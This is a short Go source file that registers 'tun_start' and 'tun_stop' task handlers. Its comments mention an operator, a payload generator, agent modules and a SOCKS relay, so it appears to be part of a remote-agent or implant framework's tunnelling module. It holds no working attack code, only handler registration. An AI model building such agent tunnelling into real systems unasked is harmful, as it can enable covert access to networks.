//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "tun" module (see internal/payload/agent_modules.go).
// The generator drops this file whole when the operator excludes the module;
// the tun_* implementations stay compiled (the SOCKS relay's tun_data path
// references tunWritePacket), but the operator loses the task surface.

func init() {
	taskHandlers["tun_start"] = handleTunStart
	taskHandlers["tun_stop"] = handleTunStop
}
